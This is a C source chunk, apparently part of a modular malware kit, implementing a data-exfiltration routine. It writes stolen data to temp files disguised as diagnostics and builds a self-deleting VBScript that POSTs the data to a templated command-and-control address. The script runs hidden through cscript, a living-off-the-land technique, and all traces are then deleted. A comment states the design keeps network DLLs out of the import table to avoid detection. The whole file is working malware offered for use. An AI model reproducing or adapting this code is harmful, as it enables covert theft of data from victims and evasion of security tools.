// chunk: exfil/cscript_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: exfiltrate, flush_to_c2
// note: LOLBin exfil via cscript + VBS XMLHTTP POST — no network DLLs in IAT

#ifndef CHUNK_CSCRIPT_LOLBIN
#define CHUNK_CSCRIPT_LOLBIN

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;
    char temp_dir[MAX_PATH], data_file[MAX_PATH], vbs_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    DWORD tick = GetTickCount();
    snprintf(data_file, MAX_PATH, "%s~diag_%lx.tmp", temp_dir, tick);
    snprintf(vbs_file, MAX_PATH, "%s~diag_%lx.vbs", temp_dir, tick + 1);

    HANDLE hf = CreateFileA(data_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written;
    WriteFile(hf, data, len, &written, NULL);
    CloseHandle(hf);
    if (written != len) { DeleteFileA(data_file); return FALSE; }

    char vbs[2048];
    snprintf(vbs, sizeof(vbs),
        "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
        "Set f = fso.OpenTextFile(\"%s\", 1)\r\n"
        "d = f.ReadAll\r\n"
        "f.Close\r\n"
        "Set x = CreateObject(\"MSXML2.XMLHTTP\")\r\n"
        "x.Open \"POST\", \"http://%s:%d/\", False\r\n"
        "x.Send d\r\n"
        "fso.DeleteFile \"%s\"\r\n"
        "fso.DeleteFile WScript.ScriptFullName\r\n",
        data_file, ip, port, data_file);

    HANDLE hv = CreateFileA(vbs_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hv == INVALID_HANDLE_VALUE) { DeleteFileA(data_file); return FALSE; }
    DWORD vbs_len = (DWORD)strlen(vbs);
    WriteFile(hv, vbs, vbs_len, &written, NULL);
    CloseHandle(hv);

    char cmd[1024], out[256] = {0};
    DWORD out_len = 0;
    snprintf(cmd, sizeof(cmd), "cmd /c cscript //nologo //b \"%s\"", vbs_file);
    run_cmd(cmd, out, sizeof(out), &out_len);

    Sleep(2000);
    DeleteFileA(data_file);
    DeleteFileA(vbs_file);
    return TRUE;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}

#endif
